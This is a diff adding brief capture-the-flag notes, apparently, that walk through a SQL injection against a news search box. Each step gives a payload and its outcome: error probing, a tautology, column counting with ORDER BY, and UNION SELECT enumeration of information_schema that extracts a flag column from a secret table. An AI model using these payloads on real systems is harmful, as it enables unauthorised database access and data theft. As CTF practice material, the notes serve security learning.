@@ -1,0 +1,29 @@
+* Search news:
+
+* search: ' => 500 status => maybe SQLi
+
+* search: ' or 1=1 # 
+	=> all news post show
+	=> SQLi
+
+* how many columns ?
+	searh: ' order by 4 # => 500 status
+				 ' order by 3 # => has result
+	=> 3 columns
+
+* check type of column
+	search: ' union select 'a', 'b', 'c' # => has result
+	=> varchar
+
+* show all table in this database
+	search: ' union select null, table_name, null from information_schema.tables #	
+	=> find 'secret_table'
+
+* find name column of 'secret_table'
+	search: ' union select null, column_name, null from information_schema.columns where table_name='secret_table' #
+	=> 2 columns: id, fl4g
+	
+* select content of table:
+	search: ' union select null, fl4g, null from secret_table #
+	=> got flag
+	
